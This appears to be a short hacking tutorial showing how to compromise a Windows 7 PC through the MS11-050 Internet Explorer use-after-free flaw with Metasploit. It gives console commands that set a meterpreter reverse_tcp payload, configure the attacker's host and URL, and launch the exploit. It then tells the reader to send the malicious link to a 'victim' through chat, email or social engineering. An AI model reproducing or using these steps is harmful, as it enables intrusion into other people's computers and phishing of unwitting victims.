How to Hack Remote Windows 7 PC

This module exploits a use-after-free vulnerability in Internet Explorer. The vulnerability occurs when an invalid <object> tag exists and other elements overlap/cover where the object tag should be when rendered (due to their styles/positioning). The mshtml! CObject Element is then freed from memory because it is invalid. However, the mshtml! CDisplay object for the page continues to keep a reference to the freed <object> and attempts to call a function on it, leading to the use-after-free. Please note that for IE 8 targets, JRE (Java Runtime Environment) is required to bypass DEP (Data Execution Prevention).

Msf exploit (ms11_050_mshtml_cobjectelement)>set payload windows/meterpreter/reverse_tcp
Msf exploit (ms11_050_mshtml_cobjectelement)>set lhost 192.168.1.2 (IP of Local Host)
Msf exploit (ms11_050_mshtml_cobjectelement)>set srvhost 192.168.1.2 (This must be an address on the local machine)
Msf exploit (ms11_050_mshtml_cobjectelement) set uripath win7tricks (The Url to use for this exploit)
Msf exploit (ms11_050_mshtml_cobjectelement)>exploit

Now an URL you should give to your victim http://192.168.1.2:8080/win7tricks

Send the link of the server to the victim via chat or email or any social engineering technique.
